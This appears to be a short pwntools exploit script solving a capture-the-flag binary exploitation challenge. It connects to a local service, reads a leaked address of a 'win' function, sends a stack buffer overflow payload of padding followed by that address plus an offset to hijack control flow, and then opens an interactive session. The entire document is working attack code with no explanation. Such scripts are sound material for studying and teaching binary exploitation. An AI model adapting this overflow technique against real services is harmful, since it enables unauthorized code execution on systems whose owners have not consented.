from pwn import *
p = remote('localhost', 2001)
# p = process('../source/spermpwn')
win = int(p.recvline().split()[-1], 16)
log.info('win: ' + hex(win))
payload = b'A' * 0x10 + b'B' * 0x8 + p64(win+45)
p.sendline(payload)
p.interactive()